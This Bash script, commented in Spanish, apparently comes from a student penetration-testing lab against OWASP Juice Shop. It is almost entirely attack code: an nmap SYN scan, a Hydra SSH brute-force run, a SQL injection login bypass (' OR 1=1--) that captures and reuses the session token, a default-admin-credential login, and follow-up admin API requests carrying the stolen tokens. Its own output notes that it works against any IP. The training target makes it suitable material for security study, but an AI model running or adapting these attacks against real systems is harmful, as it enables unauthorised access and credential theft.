#!/bin/bash

# Script de ATAQUE PENTEST - CONTINUA DESPU√âS DE FALLOS
# Uso: ./pentest_attack.sh 192.168.133.131

echo "=== ATAQUE A JUICE SHOP (Contin√∫a despu√©s de fallos) ==="
echo "IP: $1"
echo ""

# Herramientas a usar
echo "INSTALANDO HERRAMIENTAS"
sudo apt update
sudo apt install nmap hydra curl jq -y

# 1. PORTSCAN (siempre funciona) - NO TOCAR
echo "1. üîç PORTSCAN:"
sudo nmap -sS -sV --open -p 22,3000 $1
echo ""

# 2. FUERZA BRUTA SSH CON HYDRA - CORREGIDO CON $1
echo "2. üîë FUERZA BRUTA SSH:"
cd /home/elpepe/Pentest_Planta_Eolica_CBS/FASE_2_ATAQUE/fuerza_brute_ssh/diccionarios
hydra -L usuarios.txt -P passwords.txt ssh://$1 -t 4 -vV -I
echo ""

# 3. SQL INJECTION EN JUICE SHOP - MEJORADO
echo "3. üóÉÔ∏è SQL INJECTION EN JUICE SHOP:"
echo " üîß Ejecutando payload: ' OR 1=1--"
echo " üì° Enviando a: http://$1:3000/rest/user/login"
echo ""

RESPONSE=$(curl -s -X POST http://$1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"test"}')

echo " üì• Respuesta del servidor:"
echo " ==========================="
if echo "$RESPONSE" | grep -q "token"; then
    echo " ‚úÖ √âXITO - SQL Injection funcion√≥!"
    echo ""
    
    # Extraer el token y email
    TOKEN=$(echo "$RESPONSE" | jq -r '.authentication.token' 2>/dev/null)
    EMAIL=$(echo "$RESPONSE" | jq -r '.authentication.umail' 2>/dev/null)
    
    echo " üîë TOKEN OBTENIDO:"
    echo " ${TOKEN:0:80}..."
    echo ""
    echo " üë§ USUARIO COMPROMETIDO: $EMAIL"
    echo ""
    echo " üóÉÔ∏è INFORMACI√ìN DE LA BASE DE DATOS:"
    echo " üìä Estructura expuesta a trav√©s del usuario:"
    echo "    - Tabla: Users"
    echo "    - Campos: email, password, token"
    echo "    - Primer usuario en la consulta comprometido"
    
    # DEMOSTRACI√ìN R√ÅPIDA CON EL TOKEN
    if [ ! -z "$TOKEN" ] && [ "$TOKEN" != "null" ]; then
        echo ""
        echo "üéØ DEMOSTRACI√ìN R√ÅPIDA CON TOKEN:"
        echo "================================="
        
        # Verificar si es admin
        echo "üîç Verificando privilegios..."
        ADMIN_CHECK=$(curl -s -H "Authorization: Bearer $TOKEN" http://$1:3000/rest/user/whoami)
        if echo "$ADMIN_CHECK" | grep -q "admin"; then
            echo "‚úÖ ¬°TOKEN DE ADMINISTRADOR OBTENIDO!"
            echo ""
            echo "üöÄ ACCIONES INMEDIATAS DISPONIBLES:"
            echo "   curl -H 'Authorization: Bearer $TOKEN' http://$1:3000/rest/admin/users"
            echo "   curl -H 'Authorization: Bearer $TOKEN' http://$1:3000/rest/admin/application-configuration"
        else
            echo "üë§ Token de usuario normal"
            echo "üí° Puedes acceder a datos del usuario"
        fi
    fi
else
    echo " ‚ùå FALL√ì - SQL Injection no funcion√≥"
    echo " Respuesta completa: $RESPONSE"
fi
echo ""

# 4. VERIFICAR SERVICIO WEB (siempre funciona)
echo "4. üåê VERIFICAR SERVICIO WEB:"
curl -s -I http://$1:3000 | head -5
if [ $? -eq 0 ]; then
    echo "‚úÖ √âXITO - Servicio web activo"
    echo " URL: http://$1:3000"
else
    echo "‚ùå FALL√ì - Servicio web no responde"
fi
echo ""

# 5. PROBAR CREDENCIALES POR DEFECTO - MEJORADO
echo "5. üîê PROBAR CREDENCIALES POR DEFECTO:"
echo " üîß Probando: admin@juice-sh.op / admin123"
echo " üì° Enviando a: http://$1:3000/rest/user/login"
echo ""

RESPONSE2=$(curl -s -X POST http://$1:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}')

echo " üì• Respuesta del servidor:"
echo " ==========================="
if echo "$RESPONSE2" | grep -q "token"; then
    echo " ‚úÖ √âXITO - Credenciales por defecto funcionaron!"
    echo ""
    
    TOKEN2=$(echo "$RESPONSE2" | jq -r '.authentication.token' 2>/dev/null)
    echo " üîë TOKEN OBTENIDO:"
    echo " ${TOKEN2:0:80}..."
    
    # Si son credenciales de admin, mostrar poder√≠o
    if [ ! -z "$TOKEN2" ] && [ "$TOKEN2" != "null" ]; then
        echo ""
        echo " ¬°CREDENCIALES DE ADMINISTRADOR!"
        echo " CONTROL TOTAL DEL SISTEMA:"
        echo "   ‚Ä¢ Gestionar usuarios"
        echo "   ‚Ä¢ Modificar configuraciones"
        echo "   ‚Ä¢ Acceder a todos los datos"
        echo "   ‚Ä¢ Eliminar/crear recursos"
    fi
else
    echo " ‚ùå FALL√ì - Credenciales por defecto no funcionaron"
    echo " Respuesta completa: $RESPONSE2"
fi
echo ""

# 6. RESUMEN FINAL MEJORADO
echo "=== RESUMEN DE RESULTADOS ==="
echo "‚úÖ Ataques probados contra: $1"
echo "‚úÖ Script adaptable a cualquier IP"
echo "‚úÖ Continuaci√≥n despu√©s de fallos"
echo ""
echo "üéØ PR√ìXIMOS PASOS SI OBTIENES TOKENS:"
echo "   curl -H 'Authorization: Bearer TOKEN' http://$1:3000/rest/admin/users"
echo "   curl -H 'Authorization: Bearer TOKEN' http://$1:3000/rest/user/whoami"
echo ""
echo "üîß PARA PRUEBAS MANUALES:"
echo "   Navega a: http://$1:3000"
echo "   Usa Burp Suite para m√°s pruebas"
echo ""
echo "‚úÖ Script completado - An√°lisis listo para mitigaciones"
